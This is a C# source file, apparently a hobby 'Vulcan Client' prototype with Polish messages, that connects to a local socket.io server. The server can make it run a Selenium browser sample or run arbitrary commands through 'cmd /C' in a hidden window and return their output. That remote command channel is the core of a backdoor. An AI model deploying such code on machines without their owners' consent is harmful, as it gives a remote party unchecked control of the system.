using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using SocketIOClient;
using System.Threading.Tasks;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using Microsoft.Win32;
using System.Net.Http;
using OpenQA.Selenium.Remote;

namespace VulcanClient2
{
    class Program
    {
        static async Task Main(string[] args)
        {
            var client = new HttpClient();
            
            Console.WriteLine("Vulcan Client");
            Console.OutputEncoding = Encoding.UTF8;


            var uri = new Uri("http://localhost:3000/clients");
            var socket = new SocketIO(uri);

            socket.OnConnected += Socket_OnConnected;
            socket.OnDisconnected += Socket_onDisconnected;


            socket.On("website", async response =>
            {
                DriverManager driverManager = new DriverManager();
                var currentDirectory = Directory.GetCurrentDirectory();
                if (!File.Exists($"{currentDirectory}/drivers/{driverManager.SelectedDriver.Filename}"))
                {
                    await Task.Run(() => driverManager.SelectedDriver.DownloadDriver());
                }
                else
                {
                    using (var driver = driverManager.SelectedDriver.GetDriver())
                    {
                        WebDriverWait wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
                        driver.FindElement(By.Name("q")).SendKeys("cheese" + Keys.Enter);
                        wait.Until(driver => driver.FindElement(By.CssSelector("h3>div")).Displayed);
                        IWebElement firstResult = driver.FindElement(By.CssSelector("h3>div"));
                        Console.WriteLine(firstResult.GetAttribute("textContent"));
                    }
                }
            });
            
            socket.On("command", async response =>
            {
                string cmd = "/C " + response.GetValue<string>();

                var process = new Process();
                var startInfo = new ProcessStartInfo();

                startInfo.FileName = "cmd";
                startInfo.Arguments = cmd;
                startInfo.CreateNoWindow = true;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;

                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();

                StreamReader reader = process.StandardOutput;
                string cmdOutput = reader.ReadToEnd();

                Console.WriteLine(process.StandardOutput.ReadToEnd());

                await socket.EmitAsync("command", new
                {
                    message = cmdOutput
                });
            });
            await socket.ConnectAsync();
            Console.ReadLine();
        }

        private static void Socket_OnConnected(object sender, EventArgs e)
        {
            var socket = sender as SocketIO;
            Console.WriteLine("Klient polaczony " + socket.Id);
        }

        private static void Socket_onDisconnected(object sender, string e)
        {
            Console.WriteLine("Klient rozlaczony");
        }
    }
}